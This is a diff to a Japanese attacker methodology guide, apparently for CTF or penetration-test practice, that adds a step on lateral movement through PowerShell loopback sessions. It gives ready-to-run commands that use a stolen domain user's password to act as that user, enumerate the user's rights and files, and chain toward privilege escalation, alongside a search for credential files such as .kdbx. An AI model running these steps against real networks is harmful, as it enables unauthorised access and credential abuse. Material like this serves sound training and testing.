@@ -268,6 +268,71 @@ dir /s /b C:\ | findstr /i "config.json web.config .kdbx"
 
 ---
 
+## Step 7.5: PSSession による別ユーザーとしての横断移動
+
+**着火条件：** GenericAll / ForcePasswordChange / KeePass からの認証情報等で **別のドメインユーザーのパスワードが判明**しており、そのユーザーとして操作したい場合。または WinRM 直接接続でなく、**ローカルループバック（127.0.0.1）経由で PSSession を張る**必要がある場合。
+
+> **PSSession とは：** PowerShell Remoting（WinRM 上で動作）を使って別の Windows ホストまたは別ユーザーのコンテキストでコマンドを実行できる仕組み。`New-PSSession` でセッションを作成し、`Enter-PSSession` で対話操作、`Invoke-Command` でコマンドを送り込む。
+
+**攻撃者の思考トレース：** evil-winrm でのリモートシェルは「外から入る」経路。PSSession の 127.0.0.1 接続は「ターゲット内部で別ユーザーに乗り換える」経路。WinRM が外部から閉じていても内部では使えることが多い。
+
+### 別ユーザーとして対話シェルに入る
+
+```powershell
+# [Target] 移行先ユーザーの認証情報を作成
+$pass = ConvertTo-SecureString -AsPlainText -Force '[TARGET_USER_PASSWORD]'
+$cred = New-Object System.Management.Automation.PSCredential('[DOMAIN]\[TARGET_USER]', $pass)
+
+# セッション作成・接続
+$session = New-PSSession -ComputerName 127.0.0.1 -Credential $cred
+Enter-PSSession -Session $session
+
+# 確認
+whoami    # → DOMAIN\TARGET_USER になっていることを確認
+```
+
+### 別ユーザーとしてコマンドを1回実行（対話不要な場合）
+
+```powershell
+# [Target] Invoke-Command で単発実行（セッションを作らずに済む）
+$pass = ConvertTo-SecureString '[TARGET_USER_PASSWORD]' -AsPlaintext -Force
+$cred = New-Object System.Management.Automation.PSCredential('[DOMAIN]\[TARGET_USER]', $pass)
+Invoke-Command -ComputerName 127.0.0.1 -Credential $cred -ScriptBlock { whoami }
+# → 確認後、必要なコマンドを ScriptBlock 内に入れる
+```
+
+**PSSession で確認すべき事項（別ユーザーになったら最初に実行）：**
+
+```powershell
+# [Target/PSSession] 権限の確認
+whoami /all
+
+# グループ所属（次の権限昇格の手掛かり）
+net user [TARGET_USER] /domain
+
+# このユーザーのデスクトップ・ドキュメントに何があるか
+dir C:\Users\[TARGET_USER]\Desktop
+dir C:\Users\[TARGET_USER]\Documents
+
+# BloodHound で次のエッジを確認（別ウィンドウ）
+# → このユーザーの次の GenericAll / ForcePasswordChange / WriteDACL 等を確認する
+```
+
+### PSSession の終了と次のユーザーへの移行
+
+```powershell
+# [Target] PSSession を終了して1つ前のセッションに戻る
+exit
+
+# → 戻ったセッションから次のユーザーへの操作を実行する
+```
+
+**注意点：**
+- PSSession を多段で積み上げると混乱する。`whoami` で常に現在のユーザーを確認する
+- ループバック（`127.0.0.1`）接続が失敗する場合は、WinRM のローカルループバック許可を確認: `winrm get winrm/config/client`
+
+---
+
 ## Step 8: Windows PoC の取得・転送・実行（CVE悪用が必要な場合）
 
 CVE の悪用に PoC（概念実証コード）が必要な場合の手順。Linux の場合は `wget` + `make` が基本だが、Windows では転送手段が異なる。
